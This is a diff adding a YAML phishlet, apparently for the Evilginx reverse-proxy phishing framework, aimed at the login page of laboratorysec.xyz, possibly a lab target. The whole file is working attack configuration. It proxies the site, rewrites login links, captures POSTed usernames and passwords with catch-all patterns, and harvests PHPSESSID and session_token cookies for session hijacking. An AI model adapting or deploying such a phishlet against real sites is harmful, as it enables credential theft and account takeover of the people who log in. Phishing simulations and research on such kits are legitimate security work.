@@ -1,0 +1,26 @@
+name: laboratorysec
+author: 'QTudor'
+min_ver: '3.0.0'
+proxy_hosts:
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'laboratorysec.xyz', session: true, is_landing: true}
+  - {phish_sub: '', orig_sub: '', domain: 'laboratorysec.xyz', session: false, is_landing: false}
+sub_filters:
+  - {triggers_on: 'www.laboratorysec.xyz', orig_sub: 'www', domain: 'laboratorysec.xyz', search: 'href="https://{hostname}/loginpage.php', replace: 'href="https://{hostname}/loginpage.php"', mimes: ['text/html', 'application/javascript', 'application/json']}
+  - {triggers_on: 'www.laboratorysec.xyz', orig_sub: 'www', domain: 'laboratorysec.xyz', search: 'https://{hostname}/loginpage.php', replace: 'https://{hostname}/loginpage.php', mimes: ['text/html', 'application/javascript', 'application/json'], redirect_only: true}
+auth_tokens:
+  - domain: 'www.laboratorysec.xyz'
+    keys: ['PHPSESSID', 'session_token']
+credentials:
+  username:
+    key: 'username'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'password'
+    search: '(.*)'
+    type: 'post'
+auth_urls:
+  - '/index.php'
+login:
+  domain: 'www.laboratorysec.xyz'
+  path: '/loginpage.php'
